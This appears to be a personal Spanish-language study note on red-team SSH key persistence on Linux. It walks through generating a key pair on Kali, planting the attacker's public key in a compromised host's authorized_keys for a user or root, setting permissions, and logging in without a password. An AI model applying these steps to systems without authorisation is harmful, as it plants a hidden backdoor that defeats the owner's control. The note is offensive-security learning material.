---
title: Persistencia por ssh linux
area: ciberseguridad
tipo: herramienta
tags: [ciberseguridad, red-team, explotacion]
created: 2026-02-08
updated: 2026-09-20
related: ["[[MOC-ciberseguridad]]", "[[red-team-killchain]]", "[[Nmap]]", "[[Metasploit]]", "[[Permisos, Servicios y Logs en Linux]]", "[[conceptos]]"]
---

# 📌 Persistencia por SSH usando llaves (SSH Key Persistence)

## 🧠 ¿Qué es la persistencia por SSH?

Es una técnica donde el atacante **configura acceso por llaves SSH** para poder volver a entrar a la máquina **sin contraseña**, incluso después de cerrar sesión.  
Mientras el sistema **no se reinicie o no se borre la configuración**, el acceso se mantiene.

---

## 🧑‍💻 LADO DEL ATACANTE (Kali Linux)

### 1️⃣ Generar el par de llaves SSH

`ssh-keygen`

- Genera:
    
    - 🔑 `id_rsa` → **clave privada** (NO se comparte)
        
    - 🔓 `id_rsa.pub` → **clave pública** (se copia a la víctima)
        
- Se guardan por defecto en:
    
    `~/.ssh/`
    

---

### 2️⃣ Ver la clave pública

`cat ~/.ssh/id_rsa.pub`

📌 Esta clave es la que se va a pegar en la máquina víctima.

---

### 3️⃣ Conectarse usando la clave privada

`ssh -i ~/.ssh/id_rsa usuario@IP_VICTIMA`

Si todo está bien:

- ❌ No pide contraseña
    
- ✅ Acceso directo
    

---

## 🎯 LADO DE LA VÍCTIMA (máquina comprometida)

> ⚠️ Normalmente esto se hace **después de escalar privilegios** (root o usuario con home).

---

### 4️⃣ Crear el directorio `.ssh`

`mkdir -p /home/usuario/.ssh`

o si es root:

`mkdir -p /root/.ssh`

---

### 5️⃣ Crear el archivo correcto

`nano /home/usuario/.ssh/authorized_keys`

📌 **Nombre exacto (muy importante):**

`authorized_keys`

- todo en minúsculas
    
- con `_`
    
- sin espacios
    

👉 Aquí se **pega la clave pública del atacante**.

---

### 6️⃣ Asignar permisos correctos (CRÍTICO)

`chmod 700 /home/usuario/.ssh 
`chmod 600 /home/usuario/.ssh/authorized_keys 
`chown -R usuario:usuario /home/usuario/.ssh`

Para root:

`
`chmod 700 /root/.ssh 
`chmod 600 /root/.ssh/authorized_keys 
`chown -R root:root /root/.ssh





para conectarse 

ejemplo : ` ssh -i ~/.ssh/id_rsa root@172.17.0.2

## Ver también

- [[MOC-ciberseguridad]]
- [[red-team-killchain]]
- [[Nmap]]
- [[Metasploit]]
- [[Permisos, Servicios y Logs en Linux]]
- [[conceptos]]
